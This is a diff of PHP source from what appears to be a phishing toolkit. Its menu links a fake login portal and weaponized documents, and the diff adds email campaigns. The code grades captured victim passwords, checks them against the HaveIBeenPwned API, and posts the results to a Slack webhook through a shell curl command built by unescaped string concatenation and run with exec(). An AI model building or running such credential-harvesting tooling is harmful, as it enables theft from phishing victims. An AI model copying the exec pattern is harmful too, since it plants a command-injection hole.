@@ -119,8 +119,8 @@ if($redirect == false){ ?>
 <BODY>
 <CENTER>
 <BR><BR><BR><TABLE>
-<TR><TH>Fake Portal</TH><TH>Weaponized Documents</TH></TR>
-<TR><TD><a href="index.php?fakesite=1"><img src="genericlogin.png" width="300" height="300"></a></TD><TD><a href="/phishingdocs/"><img src="mswordlogo.png" width="300" height="300"></a></TD></TR>
+<TR><TH>Fake Portal</TH><TH>Weaponized Documents</TH><TH>Email Campaigns</TH></TR>
+<TR><TD><a href="index.php?fakesite=1"><img src="genericlogin.png" width="300" height="300"></a></TD><TD><a href="/phishingdocs/"><img src="mswordlogo.png" width="300" height="300"></a></TD><TD><a href="campaigns/"><img src="campaignslogo.png" width="300" height="300"></a></TD></TR>
 </TABLE>
 </CENTER>
 </BODY>
@@ -189,10 +189,8 @@ if (preg_match("#.*^(?=.{8,20})(?=.*[a-z])(?=.*[A-Z])(?=.*[0-9]).*$#", base64_de
     $passstrength = ":poop:";
 }
 
-//Checks HaveIBeenPwned DB
+// Checks HaveIBeenPwned DB
 $sha1pass = strtoupper(sha1(base64_decode($pass)));
-
-//echo $sha1pass."\r\n";
 
 $cmd2 = 'curl -s -X GET "https://api.pwnedpasswords.com/range/'.substr($sha1pass, 0, 5).'"';
 
@@ -205,7 +203,6 @@ $pwnedarray = array();
 $arraywithcount = array();
 
 foreach($pwned as $pwned2){
-//array_push($pwnedarray, array(substr($pwned2, 0, strrpos($pwned2, ':')), substr($pwned2, 1, strrpos($pwned2, ':'))));
 $pos = strpos($pwned2, ":");
 $shahash = substr($pwned2, 0, strrpos($pwned2, ':'));
 $hashcount = substr($pwned2, $pos + 1);
@@ -240,8 +237,6 @@ if($TroyHunt == "yes"){$message = $message."\r\n> *_HaveIBeenPwned Hit_* (".numb
 
 // Execute Slack Incoming Webhook
 $cmd = 'curl -s -X POST --data-urlencode \'payload={"channel": "'.$slackchannel.'", "username": "'.$slackbotname.'", "text": "'.$message.'", "icon_emoji": "'.$slackemoji.'"}\' '.$SlackIncomingWebhookURL.'';
-
-//$cmd = $cmd."  > /dev/null 2>&1 &";
 
 exec($cmd);
 
